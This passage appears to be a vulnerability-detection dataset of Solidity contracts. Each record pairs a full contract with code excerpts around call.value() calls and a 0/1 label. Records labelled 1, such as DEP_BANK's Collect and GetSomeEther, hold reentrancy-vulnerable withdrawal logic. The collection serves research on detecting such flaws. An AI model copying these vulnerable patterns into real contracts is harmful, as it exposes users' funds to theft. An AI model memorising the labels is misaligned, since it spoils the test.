challengeOwner); daoAccounts[accountOwner] = account; notifyNewAccount(accountOwner, address(account)); } return account; } function getTokenBalance () constant noEther returns (uint256 tokens) { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) return 0; return account.getTokenBalance(); } function buyTokens () returns (uint256 tokens) { DaoAccount account = accountFor(msg.sender, true); tokens = account.buyTokens.value(msg.value)(); notifyBuyToken(msg.sender, tokens, msg.value); return tokens; } function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); } function terminate() noEther onlyChallengeOwner { notifyTerminate(this.balance); suicide(challengeOwner); } } "}
{"sol name": "39684.sol", "label": 0, "first path": "function () payable { if (msg.data.length > 0) { createSeries(msg.data, 0, \"\", \"\", 0x0); } else if (latestSeriesForUser[msg.sender] != 0) { if (latestSeriesForUser[msg.sender].call.value(msg.value)()) DepositMade(latestSeriesForUser[msg.sender], msg.value); } else { createSeries(\"\", 0, \"\", \"\", 0x0); contract SeriesFactory { address public seriesFactory; address public owner; ", "second path": "function () payable { if (msg.data.length > 0) { createSeries(msg.data, 0, \"\", \"\", 0x0); } else if (latestSeriesForUser[msg.sender] != 0) { if (latestSeriesForUser[msg.sender].call.value(msg.value)()) DepositMade(latestSeriesForUser[msg.sender], msg.value); } else { createSeries(\"\", 0, \"\", \"\", 0x0); contract SeriesFactory { address public seriesFactory; address public owner; ", "third path": "function () payable { if (msg.data.length > 0) { createSeries(msg.data, 0, \"\", \"\", 0x0); } else if (latestSeriesForUser[msg.sender] != 0) { if (latestSeriesForUser[msg.sender].call.value(msg.value)()) DepositMade(latestSeriesForUser[msg.sender], msg.value); } else { createSeries(\"\", 0, \"\", \"\", 0x0); contract SeriesFactory { address public seriesFactory; address public owner; ", "long path": "pragma solidity ^0.4.9; contract EtherprisesLLC { address public seriesFactory; address public generalManager; address[] public series; string[] public prose; mapping (address => address) public latestSeriesForUser; mapping (address => uint) public expiresAt; mapping (bytes32 => address) public seriesByName; mapping (address => bytes32) public seriesByAddress; event AmendmentAdded (string newAmendment); event FeePaid (address which); event ManagerSet(address newManager); event FactorySet(address newFactory); event DepositMade(address where, uint amount); event SeriesCreated(address addr, uint id); function EtherprisesLLC() { generalManager = msg.sender; } modifier ifGeneralManager { if (msg.sender != generalManager) throw; _; } modifier ifSeries { if (expiresAt[msg.sender] == 0) throw; _; } function withdraw() ifGeneralManager { generalManager.send(this.balance); } function isExpired(address addr) constant returns (bool) { if (expiresAt[addr] > now) return false; else return true; } function addAmendment(string newAmendment) ifGeneralManager { prose.push(newAmendment); AmendmentAdded(newAmendment); } function payFee() ifSeries payable returns (bool) { if (msg.value != 1 ether) throw; expiresAt[msg.sender] += 1 years; FeePaid(msg.sender); return true; } function setManager(address newManger) ifGeneralManager { generalManager = newManger; ManagerSet(newManger); } function setFactory(address newFactory) ifGeneralManager { seriesFactory = newFactory; FactorySet(newFactory); } function createSeries(bytes name, uint shares, string industry, string symbol, address extraContract) payable returns (address seriesAddress,uint seriesId) { seriesId = series.length; var(latestAddress, latestName) = SeriesFactory(seriesFactory).createSeries.value(msg.value)(seriesId, name, shares, industry, symbol, msg.sender, extraContract); if (latestAddress == 0) throw; if (latestName > 0) if (seriesByName[latestName] == 0) seriesByName[latestName] = latestAddress; else throw; series.push(latestAddress); expiresAt[latestAddress] = now + 1 years; latestSeriesForUser[msg.sender] = latestAddress; seriesByAddress[latestAddress] = latestName; SeriesCreated(latestAddress, seriesId); return (latestAddress, seriesId); } function addr(bytes32 _name) constant returns(address o_address) { return seriesByName[_name]; } function name(address _owner) constant returns(bytes32 o_name){ return seriesByAddress[_owner]; } function () payable { if (msg.data.length > 0) { createSeries(msg.data, 0, \"\", \"\", 0x0); } else if (latestSeriesForUser[msg.sender] != 0) { if (latestSeriesForUser[msg.sender].call.value(msg.value)()) DepositMade(latestSeriesForUser[msg.sender], msg.value); } else { createSeries(\"\", 0, \"\", \"\", 0x0); } } } contract SeriesFactory { address public seriesFactory; address public owner; function createSeries (uint seriesId,bytes name,uint shares,string industry,string symbol,address manager,address extraContract) payable returns (address addr,bytes32 newName) { address newSeries; bytes32 _newName; return (newSeries, _newName); } } "}
{"sol name": "9611.sol", "label": 0, "first path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "second path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "third path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "long path": "pragma solidity ^0.4.24; interface CommAuctionIface { function getNextPrice(bytes32 democHash) external view returns (uint); function noteBallotDeployed(bytes32 democHash) external; function upgradeMe(address newSC) external; } contract safeSend { bool private txMutex3847834; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); } function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; } } contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; } function _getPayTo() internal view returns (address) { return _payTo; } function _setPayTo(address newPayTo) internal { _payTo = newPayTo; } function payoutAll() external { address a = _getPayTo(); uint bal = address(this).balance; doSafeSend(a, bal); emit PayoutAll(a, bal); } } contract payoutAllCSettable is payoutAllC { constructor (address initPayTo) payoutAllC(initPayTo) public { } function setPayTo(address) external; function getPayTo() external view returns (address) { return _getPayTo(); } } contract owned { address public owner; event OwnerChanged(address newOwner); modifier only_owner() { require(msg.sender == owner, \"only_owner: forbidden\"); _; } modifier owner_or(address addr) { require(msg.sender == addr || msg.sender == owner, \"!owner-or\"); _; } constructor() public { owner = msg.sender; } function setOwner(address newOwner) only_owner() external { owner = newOwner; emit OwnerChanged(newOwner); } } contract CommunityAuctionSimple is owned { uint public commBallotPriceWei = 1666666666000000; struct Record { bytes32 democHash; uint ts; } mapping (address => Record[]) public ballotLog; mapping (address => address) public upgrades; function getNextPrice(bytes32) external view returns (uint) { return commBallotPriceWei; } function noteBallotDeployed(bytes32 d) external { require(upgrades[msg.sender] == address(0)); ballotLog[msg.sender].push(Record(d, now)); } function upgradeMe(address newSC) external { require(upgrades[msg.sender] == address(0)); upgrades[msg.sender] = newSC; } function getBallotLogN(address a) external view returns (uint) { return ballotLog[a].length; } function setPriceWei(uint newPrice) only_owner() external { commBallotPriceWei = newPrice; } } contract controlledIface { function controller() external view returns (address); } contract hasAdmins is owned { mapping (uint => mapping (address => bool)) admins; uint public currAdminEpoch = 0; bool public adminsDisabledForever = false; address[] adminLog; event AdminAdded(address indexed newAdmin); event AdminRemoved(address indexed oldAdmin); event AdminEpochInc(); event AdminDisabledForever(); modifier only_admin() { require(adminsDisabledForever == false, \"admins must not be disabled\"); require(isAdmin(msg.sender), \"only_admin: forbidden\"); _; } constructor() public { _setAdmin(msg.sender, true); } function isAdmin(address a) view public returns (bool) { return admins[currAdminEpoch][a]; } function getAdminLogN() view external returns (uint) { return adminLog.length; } function getAdminLog(uint n) view external returns (address) { return adminLog[n]; } function upgradeMeAdmin(address newAdmin) only_admin() external { require(msg.sender != owner, \"owner cannot upgrade self\"); _setAdmin(msg.sender, false); _setAdmin(newAdmin, true); } function setAdmin(address a, bool _givePerms) only_admin() external { require(a != msg.sender && a != owner, \"cannot change your own (or owner's) permissions\"); _setAdmin(a, _givePerms); } function _setAdmin(address a, bool _givePerms) internal { admins[currAdminEpoch][a] = _givePerms; if (_givePerms) { emit AdminAdded(a); adminLog.push(a); } else { emit AdminRemoved(a); } } function incAdminEpoch() only_owner() external { currAdminEpoch++; admins[currAdminEpoch][msg.sender] = true; emit AdminEpochInc(); } function disableAdminForever() internal { currAdminEpoch++; adminsDisabledForever = true; emit AdminDisabledForever(); } } contract permissioned is owned, hasAdmins { mapping (address => bool) editAllowed; bool public adminLockdown = false; event PermissionError(address editAddr); event PermissionGranted(address editAddr); event PermissionRevoked(address editAddr); event PermissionsUpgraded(address oldSC, address newSC); event SelfUpgrade(address oldSC, address newSC); event AdminLockdown(); modifier only_editors() { require(editAllowed[msg.sender], \"only_editors: forbidden\"); _; } modifier no_lockdown() { require(adminLockdown == false, \"no_lockdown: check failed\"); _; } constructor() owned() hasAdmins() public { } function setPermissions(address e, bool _editPerms) no_lockdown() only_admin() external { editAllowed[e] = _editPerms; if (_editPerms) emit PermissionGranted(e); else emit PermissionRevoked(e); } function upgradePermissionedSC(address oldSC, address newSC) no_lockdown() only_admin() external { editAllowed[oldSC] = false; editAllowed[newSC] = true; emit PermissionsUpgraded(oldSC, newSC); } function upgradeMe(address newSC) only_editors() external { editAllowed[msg.sender] = false; editAllowed[newSC] = true; emit SelfUpgrade(msg.sender, newSC); } function hasPermissions(address a) public view returns (bool) { return editAllowed[a]; } function doLockdown() external only_owner() no_lockdown() { disableAdminForever(); adminLockdown = true; emit AdminLockdown(); } } contract upgradePtr { address ptr = address(0); modifier not_upgraded() { require(ptr == address(0), \"upgrade pointer is non-zero\"); _; } function getUpgradePointer() view external returns (address) { return ptr; } function doUpgradeInternal(address nextSC) internal { ptr = nextSC; } } interface ERC20Interface { function totalSupply() constant external returns (uint256 _totalSupply); function balanceOf(address _owner) constant external returns (uint256 balance); function transfer(address _to, uint256 _value) external returns (bool success); function transferFrom(address _from, address _to, uint256 _value) external returns (bool success); function approve(address _spender, uint256 _value) external returns (bool success); function allowance(address _owner, address _spender) constant external returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } "}
{"sol name": "23387.sol", "label": 0, "first path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){ if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){ if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){ if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.15; contract ERC20Interface { function totalSupply() public constant returns(uint256 totalSupplyReturn); function balanceOf(address _owner) public constant returns(uint256 balance); function transfer(address _to, uint256 _value) public returns(bool success); function transferFrom(address _from, address _to, uint256 _value) public returns(bool success); function approve(address _spender, uint256 _value) public returns(bool success); function allowance(address _owner, address _spender) public constant returns(uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract MultiSigWallet { event Confirmation(address indexed sender, uint indexed transactionId); event Revocation(address indexed sender, uint indexed transactionId); event Submission(uint indexed transactionId); event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); event Deposit(address indexed sender, uint value); event OwnerAddition(address indexed owner); event OwnerRemoval(address indexed owner); event RequirementChange(uint required); uint constant public MAX_OWNER_COUNT = 50; mapping (uint => Transaction) public transactions; mapping (uint => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] public owners; uint public required; uint public transactionCount; struct Transaction { address destination; uint value; bytes data; bool executed; } modifier onlyWallet() { require(msg.sender == address(this)); _; } modifier ownerDoesNotExist(address owner) { require(!isOwner[owner]); _; } modifier ownerExists(address owner) { require(isOwner[owner]); _; } modifier transactionExists(uint transactionId) { require(transactions[transactionId].destination != 0); _; } modifier confirmed(uint transactionId, address owner) { require(confirmations[transactionId][owner]); _; } modifier notConfirmed(uint transactionId, address owner) { require(!confirmations[transactionId][owner]); _; } modifier notExecuted(uint transactionId) { require(!transactions[transactionId].executed); _; } modifier notNull(address _address) { require(_address != 0); _; } modifier validRequirement(uint ownerCount, uint _required) { require(ownerCount <= MAX_OWNER_COUNT && _required <= ownerCount && _required != 0 && ownerCount != 0); _; } function() payable { if (msg.value > 0) Deposit(msg.sender, msg.value); } function MultiSigWallet(address[] _owners, uint _required) public validRequirement(_owners.length, _required) { for (uint i=0; i<_owners.length; i++) { require(!isOwner[_owners[i]] && _owners[i] != 0); isOwner[_owners[i]] = true; } owners = _owners; required = _required; } function addOwner(address owner) public onlyWallet ownerDoesNotExist(owner) notNull(owner) validRequirement(owners.length + 1, required) { isOwner[owner] = true; owners.push(owner); OwnerAddition(owner); } function removeOwner(address owner) public onlyWallet ownerExists(owner) { isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); OwnerRemoval(owner); } function replaceOwner(address owner, address newOwner) public onlyWallet ownerExists(owner) ownerDoesNotExist(newOwner) { for (uint i=0; i<owners.length; i++) if (owners[i] == owner) { owners[i] = newOwner; break; } isOwner[owner] = false; isOwner[newOwner] = true; OwnerRemoval(owner); OwnerAddition(newOwner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; RequirementChange(_required); } function submitTransaction(address destination, uint value, bytes data)  public returns (uint transactionId){ transactionId = addTransaction(destination, value, data); confirmTransaction(transactionId); } function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function revokeConfirmation(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; Revocation(msg.sender, transactionId); } function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){ if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; } } } function isConfirmed(uint transactionId) public constant returns (bool) { uint count = 0; for (uint i=0; i<owners.length; i++) { if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } } function addTransaction(address destination, uint value, bytes data) internal notNull(destination) returns (uint transactionId) { require( destination == 0x96eE4CC8FEB236D6fbdbf8821f4D2873564B9D8f || destination == 0x873351e707257C28eC6fAB1ADbc850480f6e0633 || destination == 0xCc071f42531481fcC3977518eE9e3883a5719017 || destination == 0xB7E54Dc6dc8CAC832df05055719A0C22c7BC5F59 || isOwner[destination] || destination == address(this) ); transactionId = transactionCount; transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, executed: false }); transactionCount += 1; Submission(transactionId); } function getConfirmationCount(uint transactionId) public constant returns (uint count) { for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; } function getTransactionCount(bool pending, bool executed) public constant returns (uint count) { for (uint i=0; i<transactionCount; i++) if (   pending && !transactions[i].executed || executed && transactions[i].executed) count += 1; } function getOwners() public constant returns (address[]) { return owners; } function getConfirmations(uint transactionId) public constant returns (address[] _confirmations) { address[] memory confirmationsTemp = new address[](owners.length); uint count = 0; uint i; for (i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) { confirmationsTemp[count] = owners[i]; count += 1; } _confirmations = new address[](count); for (i=0; i<count; i++) _confirmations[i] = confirmationsTemp[i]; } function getTransactionIds(uint from, uint to, bool pending, bool executed) public constant returns (uint[] _transactionIds) { uint[] memory transactionIdsTemp = new uint[](transactionCount); uint count = 0; uint i; for (i=0; i<transactionCount; i++) if (   pending && !transactions[i].executed || executed && transactions[i].executed) { transactionIdsTemp[count] = i; count += 1; } _transactionIds = new uint[](to - from); for (i=from; i<to; i++) _transactionIds[i - from] = transactionIdsTemp[i]; } function claimTokens(address tokenAddress, uint amount) public ownerExists(msg.sender) returns(bool success) { return ERC20Interface(tokenAddress).transfer(msg.sender, amount); } } "}
{"sol name": "27334.sol", "label": 0, "first path": "function participate() payable { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if ( luckyNumberOfAddress(msg.sender) == luckyNumber) { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "second path": "function participate() payable { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if ( luckyNumberOfAddress(msg.sender) == luckyNumber) { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "third path": "function participate() payable { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if ( luckyNumberOfAddress(msg.sender) == luckyNumber) { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); ", "long path": "pragma solidity ^0.4.0; contract Ownable { address owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } } contract AddressLottery is Ownable{ struct SeedComponents{ address addr; uint additionalSeed1; uint additionalSeed2; uint additionalSeed3; } uint luckyNumber = 13; uint private secretSeed; mapping (address => bool) participated; function AddressLottery() payable { reseed(SeedComponents(msg.sender, 0x12345678, 0x123456789, uint256(block.blockhash(block.number - 1)))); } function participate() payable { require(msg.value == 0.1 ether); require(!participated[msg.sender]); if ( luckyNumberOfAddress(msg.sender) == luckyNumber) { participated[msg.sender] = true; require(msg.sender.call.value(this.balance)()); } } function luckyNumberOfAddress(address addr) internal returns(uint n){ n = uint(keccak256(addr, secretSeed)[0]) % 16; } function reseed(SeedComponents components) internal{ secretSeed = uint256(keccak256(components.addr, components.additionalSeed1, components.additionalSeed2, components.additionalSeed3)); } function kill() onlyOwner { suicide(owner); } function forceReseed() onlyOwner{ SeedComponents s; s.addr = msg.sender; s.additionalSeed1 = tx.gasprice * 13; s.additionalSeed2 = block.number * 7; s.additionalSeed3 = uint256(block.blockhash(block.number - 1)); reseed(s); } function () payable {} } "}
{"sol name": "39644.sol", "label": 0, "first path": "function revoke(address transactor, address transactee) { if (msg.sender != transactor && msg.sender != transactee) { throw; } if(!verify(transactor, transactee)) { throw; } uint32 deposit = _verifications[transactor][transactee]; delete _verifications[transactor][transactee]; if (!transactee.call.value(deposit).gas(23000)()) {  throw;  } RevokeEvent(transactor, transactee, deposit); ", "second path": "function revoke(address transactor, address transactee) { if (msg.sender != transactor && msg.sender != transactee) { throw; } if(!verify(transactor, transactee)) { throw; } uint32 deposit = _verifications[transactor][transactee]; delete _verifications[transactor][transactee]; if (!transactee.call.value(deposit).gas(23000)()) {  throw;  } RevokeEvent(transactor, transactee, deposit); ", "third path": "function revoke(address transactor, address transactee) { if (msg.sender != transactor && msg.sender != transactee) { throw; } if(!verify(transactor, transactee)) { throw; } uint32 deposit = _verifications[transactor][transactee]; delete _verifications[transactor][transactee]; if (!transactee.call.value(deposit).gas(23000)()) {  throw;  } RevokeEvent(transactor, transactee, deposit); ", "long path": "pragma solidity ^0.4.2; contract AddressOwnershipVerification { mapping(address => mapping (uint32 => address)) _requests; mapping(address => mapping (address => uint32)) _requestsReverse; mapping(address => mapping (address => uint32)) _verifications; event RequestEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit); event RemoveRequestEvent(address indexed transactor, address indexed transactee); event VerificationEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit); event RevokeEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit); function AddressOwnershipVerification() {} function () payable { uint32 value = uint32(msg.value); if (!_requestExists(msg.sender, value)) { throw; } address transactor = _requests[msg.sender][value]; _saveVerification(transactor, msg.sender, value); _deleteRequest(transactor, msg.sender); VerificationEvent(transactor, msg.sender, value); } function request(address transactee, uint32 deposit) { if (transactee == msg.sender) { throw; } if (deposit == 0) { throw; } if(verify(msg.sender, transactee)) { throw; } if (_requestExists(transactee, deposit)) { throw; } if (_requestExistsReverse(msg.sender, transactee)) { throw; } _saveRequest(msg.sender, transactee, deposit); RequestEvent(msg.sender, transactee, deposit); } function getRequest(address transactor, address transactee) returns (uint32 deposit) { return _requestsReverse[transactee][transactor]; } function removeRequest(address transactor, address transactee) returns (uint32) { if (msg.sender != transactor && msg.sender != transactee) { throw; } _deleteRequest(transactor, transactee); RemoveRequestEvent(transactor, transactee); } function verify(address transactor, address transactee) returns (bool) { return _verifications[transactor][transactee] != 0; } function revoke(address transactor, address transactee) { if (msg.sender != transactor && msg.sender != transactee) { throw; } if(!verify(transactor, transactee)) { throw; } uint32 deposit = _verifications[transactor][transactee]; delete _verifications[transactor][transactee]; if (!transactee.call.value(deposit).gas(23000)()) {  throw;  } RevokeEvent(transactor, transactee, deposit); } function _saveRequest(address transactor, address transactee, uint32 deposit) internal { _requests[transactee][deposit] = transactor; _requestsReverse[transactee][transactor] = deposit; } function _deleteRequest(address transactor, address transactee) internal { uint32 deposit = _requestsReverse[transactee][transactor]; delete _requests[transactee][deposit]; delete _requestsReverse[transactee][transactor]; } function _requestExists(address transactee, uint32 deposit) internal returns(bool) { return _requests[transactee][deposit] != 0x0000000000000000000000000000000000000000; } function _requestExistsReverse(address transactor, address transactee) internal returns(bool) { return _requestsReverse[transactee][transactor] != 0; } function _saveVerification(address transactor, address transactee, uint32 deposit) internal { _verifications[transactor][transactee] = deposit; } } "}
{"sol name": "36563.sol", "label": 0, "first path": "function forward(address _destination, uint256 _value, bytes _data) onlyOwner { require(_destination != address(0)); assert(_destination.call.value(_value)(_data)); if (_value > 0) { Withdrawal(_destination, _value, _data); function() payable { Deposit(msg.sender, msg.value); ", "second path": "function forward(address _destination, uint256 _value, bytes _data) onlyOwner { require(_destination != address(0)); assert(_destination.call.value(_value)(_data)); if (_value > 0) { Withdrawal(_destination, _value, _data); function() payable { Deposit(msg.sender, msg.value); ", "third path": "function forward(address _destination, uint256 _value, bytes _data) onlyOwner { require(_destination != address(0)); assert(_destination.call.value(_value)(_data)); if (_value > 0) { Withdrawal(_destination, _value, _data); function() payable { Deposit(msg.sender, msg.value); ", "long path": "pragma solidity ^0.4.11; contract Ownable { address owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { require(newOwner != address(0)); owner = newOwner; } } contract SharkProxy is Ownable { event Deposit(address indexed sender, uint256 value); event Withdrawal(address indexed to, uint256 value, bytes data); function SharkProxy() { owner = msg.sender; } function getOwner() constant returns (address) { return owner; } function forward(address _destination, uint256 _value, bytes _data) onlyOwner { require(_destination != address(0)); assert(_destination.call.value(_value)(_data)); if (_value > 0) { Withdrawal(_destination, _value, _data); } } function() payable { Deposit(msg.sender, msg.value); } function tokenFallback(address _from, uint _value, bytes _data) { } } contract FishProxy is SharkProxy { address lockAddr; function FishProxy(address _owner, address _lockAddr) { owner = _owner; lockAddr = _lockAddr; } function isLocked() constant returns (bool) { return lockAddr != 0x0; } function unlock(bytes32 _r, bytes32 _s, bytes32 _pl) { assert(lockAddr != 0x0); uint8 v; uint88 target; address newOwner; assembly { v := calldataload(37) target := calldataload(48) newOwner := calldataload(68) } assert(target == uint88(address(this))); assert(newOwner == msg.sender); assert(newOwner != owner); assert(ecrecover(sha3(uint8(0), target, newOwner), v, _r, _s) == lockAddr); owner = newOwner; lockAddr = 0x0; } function() payable { assert(lockAddr == address(0) || this.balance <= 1e17); Deposit(msg.sender, msg.value); } } contract FishFactory { event AccountCreated(address proxy); function create(address _owner, address _lockAddr) { address proxy = new FishProxy(_owner, _lockAddr); AccountCreated(proxy); } } "}
{"sol name": "11719.sol", "label": 1, "first path": "function Collect(uint _am) public payable { if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) { if(msg.sender.call.value(_am)())  { balances[msg.sender]-=_am; Log.AddMessage(msg.sender,_am,\"Collect\"); function() public payable { Deposit(); contract LogFile struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "second path": "function Collect(uint _am) public payable { if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) { if(msg.sender.call.value(_am)())  { balances[msg.sender]-=_am; Log.AddMessage(msg.sender,_am,\"Collect\"); function() public payable { Deposit(); contract LogFile struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "third path": "function Collect(uint _am) public payable { if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) { if(msg.sender.call.value(_am)())  { balances[msg.sender]-=_am; Log.AddMessage(msg.sender,_am,\"Collect\"); function() public payable { Deposit(); contract LogFile struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "long path": "pragma solidity ^0.4.19; contract DEP_BANK { mapping (address=>uint256) public balances; uint public MinSum; LogFile Log; bool intitalized; function SetMinSum(uint _val)    public    { if(intitalized)throw; MinSum = _val; } function SetLogFile(address _log)    public    { if(intitalized)throw; Log = LogFile(_log); } function Initialized()    public    { intitalized = true; } function Deposit()    public    payable    { balances[msg.sender]+= msg.value; Log.AddMessage(msg.sender,msg.value,\"Put\"); } function Collect(uint _am) public payable { if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) { if(msg.sender.call.value(_am)())  { balances[msg.sender]-=_am; Log.AddMessage(msg.sender,_am,\"Collect\"); } } } function() public payable { Deposit(); } } contract LogFile { struct Message { address Sender; string  Data; uint Val; uint  Time; } Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data)    public    { LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); } } "}
{"sol name": "24007.sol", "label": 1, "first path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "second path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "third path": "function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.19; contract GetSomeEther { address creator = msg.sender; uint256 public LastExtractTime; mapping (address=>uint256) public ExtractDepositTime; uint256 public freeEther; function Deposit() public payable { if(msg.value> 0.2 ether && freeEther >= 0.2 ether) { LastExtractTime = now + 2 days; ExtractDepositTime[msg.sender] = LastExtractTime; freeEther-=0.2 ether; } } function GetEther() public payable { if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) { msg.sender.call.value(0.3 ether); ExtractDepositTime[msg.sender] = 0; } } function PutEther() public payable { uint256 newVal = freeEther+msg.value; if(newVal>freeEther)freeEther=newVal; } function Kill() public payable  { if(msg.sender==creator && now>LastExtractTime + 2 days) { selfdestruct(creator); } else revert(); } function() public payable{} } "}
{"sol name": "1879.sol", "label": 0, "first path": "function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin { _upgradeTo(newImplementation); require(address(this).call.value(msg.value)(data)); ", "second path": "function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin { _upgradeTo(newImplementation); require(address(this).call.value(msg.value)(data)); ", "third path": "function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin { _upgradeTo(newImplementation); require(address(this).call.value(msg.value)(data)); ", "long path": "pragma solidity ^0.4.24; contract Proxy { function () payable external { _fallback(); } function _implementation() internal view returns (address); function _delegate(address implementation) internal { assembly { calldatacopy(0, 0, calldatasize) let result := delegatecall(gas, implementation, 0, calldatasize, 0, 0) returndatacopy(0, 0, returndatasize) switch result case 0 { revert(0, returndatasize) } default { return(0, returndatasize) } } } function _willFallback() internal { } function _fallback() internal { _willFallback(); _delegate(_implementation()); } } library AddressUtils { function 